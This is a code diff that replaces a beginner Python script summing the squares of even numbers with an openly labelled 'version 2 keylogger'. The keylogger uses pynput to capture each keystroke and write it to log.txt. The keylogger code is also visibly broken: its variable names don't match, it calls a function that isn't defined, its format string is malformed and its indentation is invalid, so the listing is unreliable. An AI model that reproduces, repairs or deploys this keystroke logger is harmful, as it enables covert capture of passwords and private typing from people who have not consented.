@@ -1,41 +1,47 @@
-#define function that checks if its an even number then takes the square of the number if its even and then adds it to the sum
-def sumofsquares(list):  
+#version 2 keylogger
 
-  ESumsquares = 0
-  for x in list:  #loop through a given list
-    if x % 2 == 0:   #check if even
-      ESumsquares = ESumsquares + (x * x)  #square it and then add to sum
-  return ESumsquares
-      
-list=[] # Create a list to store the integers.
-#asks for how many elements will be in the list to see the length of the list
-print("Insert only 1 number each time please.")
+from pynput.keyboard import Key, Listener
 
-# Using a while True loop to get the different elements for a list of integers.
-while True:
-      numberofelements = input("Please enter an integer for the number of elements in the list: ")
-      try:
-          n = int(numberofelements)  
-          #used for testing
-          #print("Input is an integer number.")
-          #print("Input number is: ", n)
-          break;
-          #if not an integer
-      except ValueError:
-          print("This is not an integer.\nPlease enter a valid integer for the number of elements in the list...") 
+	
+count     = 0
+keys_list = []
 
-# Using a for loop to get the different elements for a list of integers.
-for i in range(0, n): 
-  while True: #while 
-      num = input("Please enter an integer: ")
-      try:
-          val = int(num)
-          list.append(val)
-          #print("Input is an integer number.")
-          #print("Input number is: ", val)
-          break;
-      except ValueError:
-          print("This is not an integer.\nPlease enter a valid integer...")
+def key_press(key):
+	global keys,count
+	#adds the key button that was pressed to the keys list 
+	keys.append(key)
+	count += 1
+	#debugging
+	print("{o} pressed".format(key))
+	
+#write them into the file if count reaches 5
+	if count >= 5:
+		count = 0
+		write_file(keys)
+		keys = []
 
-print("Sum of the squares of all even numbers of that list:")
-print(sumofsquares(list))
+def write_to_file(keys):
+#if run for the first time use "w" to create the file then afterwards you have to use "a"
+	with open("log.txt", "a") as f:
+	for key in keys:
+#removes the quotations marks 
+		k = str(key).replace(",", "")
+		if k.find("space") >0:
+			#returns a string
+			f.write(str(key))
+#if it doesn't find the string that we are looking for returns a -1 value
+#if key does not exist then we just write that into the file
+		elif k.find("Key") == -1:
+			f.write(k)
+			
+		
+
+#if esc is pressed we return false and breaks out of the loop thus it stops the program
+def key_release(key):
+	if key == Key.esc:
+		return False
+
+
+#constantly keeps running this loop until we break it
+with Listener(on_press = key_press, on_release = key_release) as listener:
+	listener.join()
